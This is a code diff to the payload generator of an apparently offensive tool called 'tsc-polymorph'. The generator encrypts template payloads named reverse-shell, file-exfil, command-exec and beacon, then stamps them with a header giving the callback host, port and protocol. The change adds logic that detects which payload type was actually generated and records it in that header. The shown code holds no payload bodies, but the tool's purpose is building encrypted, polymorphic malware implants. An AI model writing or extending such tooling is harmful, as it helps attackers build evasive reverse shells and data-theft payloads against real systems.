@@ -12,21 +12,32 @@ class Generator {
 
   generate(config) {
     const rawPayload = this.template.generate(config);
+    const actualTemplate = this._detectActualTemplate(config, rawPayload);
+    const configWithActual = { ...config, _actualTemplate: actualTemplate };
     const encrypted = this.crypter.encrypt(rawPayload);
     const bodyCode = this.buildWrapper(encrypted);
-    const header = this.buildHeader(config, bodyCode);
+    const header = this.buildHeader(configWithActual, bodyCode);
     return header + '\n' + bodyCode;
+  }
+
+  _detectActualTemplate(config, rawPayload) {
+    if (rawPayload.includes('https')) return 'beacon';
+    if (rawPayload.includes('fs.readFile')) return 'file-exfil';
+    if (rawPayload.includes('child_process')) return 'command-exec';
+    if (rawPayload.includes('net')) return 'reverse-shell';
+    return config.template || 'auto';
   }
 
   buildHeader(config, bodyCode) {
     const hash = crypto.createHash('sha256').update(bodyCode, 'utf8').digest('hex');
+    const protocol = config._actualTemplate === 'beacon' ? 'https' : (config.protocol || 'tcp');
     const lines = [
       '// tsc-polymorph: v1.0.0',
       `// tsc-polymorph: host=${config.host || '127.0.0.1'}`,
       `// tsc-polymorph: port=${config.port || 4443}`,
-      `// tsc-polymorph: protocol=${config.protocol || 'tcp'}`,
+      `// tsc-polymorph: protocol=${protocol}`,
       `// tsc-polymorph: beacon=${config.beacon || 60}`,
-      `// tsc-polymorph: template=${config.template || 'auto'}`,
+      `// tsc-polymorph: template=${config._actualTemplate || config.template || 'auto'}`,
       `// tsc-polymorph: timestamp=${new Date().toISOString()}`,
       `// tsc-polymorph: hash=sha256:${hash}`,
       '// ====PAYLOAD===='
